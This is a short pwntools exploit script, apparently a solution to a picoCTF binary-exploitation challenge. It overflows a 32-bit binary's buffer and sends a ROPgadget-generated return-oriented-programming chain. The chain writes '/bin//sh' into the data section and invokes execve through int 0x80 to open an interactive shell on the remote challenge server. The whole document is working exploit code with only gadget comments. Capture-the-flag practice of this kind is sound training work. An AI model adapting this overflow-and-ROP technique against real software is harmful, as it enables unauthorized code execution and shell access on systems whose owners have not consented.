from pwn import *

#p = process("./vuln")
#gdb.attach(p)

p = remote("saturn.picoctf.net", 54471)

# ROPgadget --binary ./vuln --ropchain made all of the below...
# execve generated by ROPgadget

# Padding goes here
payload = b'A'*28
payload += p32(0x080583c9) # pop edx ; pop ebx ; ret
payload += p32(0x080e5060) # @ .data
payload += p32(0x41414141) # padding
payload += p32(0x080b074a) # pop eax ; ret
payload += b'/bin'
payload += p32(0x08059102) # mov dword ptr [edx], eax ; ret
payload += p32(0x080583c9) # pop edx ; pop ebx ; ret
payload += p32(0x080e5064) # @ .data + 4
payload += p32(0x41414141) # padding
payload += p32(0x080b074a) # pop eax ; ret
payload += b'//sh'
payload += p32(0x08059102) # mov dword ptr [edx], eax ; ret
payload += p32(0x080583c9) # pop edx ; pop ebx ; ret
payload += p32(0x080e5068) # @ .data + 8
payload += p32(0x41414141) # padding
payload += p32(0x0804fb90) # xor eax, eax ; ret
payload += p32(0x08059102) # mov dword ptr [edx], eax ; ret
payload += p32(0x08049022) # pop ebx ; ret
payload += p32(0x080e5060) # @ .data
payload += p32(0x08049e39) # pop ecx ; ret
payload += p32(0x080e5068) # @ .data + 8
payload += p32(0x080583c9) # pop edx ; pop ebx ; ret
payload += p32(0x080e5068) # @ .data + 8
payload += p32(0x080e5060) # padding without overwrite ebx
payload += p32(0x0804fb90) # xor eax, eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0808055e) # inc eax ; ret
payload += p32(0x0804a3d2) # int 0x80

p.recvline()
p.sendline(payload)

p.interactive()
